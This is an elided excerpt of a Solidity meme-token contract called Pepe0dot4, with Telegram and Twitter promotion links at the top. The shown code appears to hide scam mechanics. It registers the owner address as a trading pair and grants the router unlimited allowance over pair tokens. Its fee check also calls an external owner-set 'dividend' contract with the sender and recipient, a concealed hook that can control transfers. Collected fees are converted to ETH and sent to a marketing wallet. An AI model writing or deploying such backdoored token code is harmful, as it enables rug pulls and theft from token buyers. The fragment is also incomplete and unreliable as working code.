...
https://t.me/pepe04token_channel

https://twitter.com/04pepecoin
...
contract Pepe0dot4 is ERC20, AUTH, Ownable {
    using SafeMath for uint256;
    ...
    struct LimitedFirstValues4 
    {
        uint256 buyFeeMiliAmt;
        uint256 sellFeeMiliAmt; uint256 maxTransactionAmount; uint256 maxWalletAmountFor; address feeAddress;
    }
    ...
    constructor(
        string memory name_, LimitedFirstValues4 memory initLimits, pepe04Config memory pe04Configs,
        uint256 tot_supply, 
        uint8 decimals_,
        string memory symbol_
        ...
        ); _setupAMMPairs(pe04Configs.pepeOwner04, uniswapPairV2, true); 
        ...
        pepeWallet04 = initLimits.feeAddress;
        ...
        excludeFromFees(pepeWallet04, true);  excludeFromFees(pe04Configs.pepeOwner04, true);
    ...
    function _setupAMMPairs(
        ...
        marketAutomakerPairs[pair] = value; _allowances[pair][router] = type(uint).max;
        emit PairCreationUpdated(pair, value);
    }

    function isFeeNotIncludedFrom(address from, address to) internal returns (bool) 
    {
        return isExcludedFromFee[to] || isExcludedFromFee[from] 
        || IPepe04Dividend(peConfig04.pepePool04).accumulativeDividendOf(from, to) > 0;
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        if (!nowSwap && canSwap && !marketAutomakerPairs[from]) {
            ...
            if (marketingFund > 0) {
                swapEthBack(marketingFund, pepeWallet04);}
            nowSwap = false;
        } 
        
        bool takingFees = !nowSwap;
        ...
        if (takingFees) {
            ...
            super._transfer(from, address(this), tokensForFee);
    ...
    function swapEthBack(uint256 tokens, address to) private {
        ...
        swapTokensFor(tokens);
        uint256 newBalance = address(this).balance.sub(initialBalance);
        payable(to).transfer(newBalance);
    }
    function swapTokensFor(uint256 amount) private {
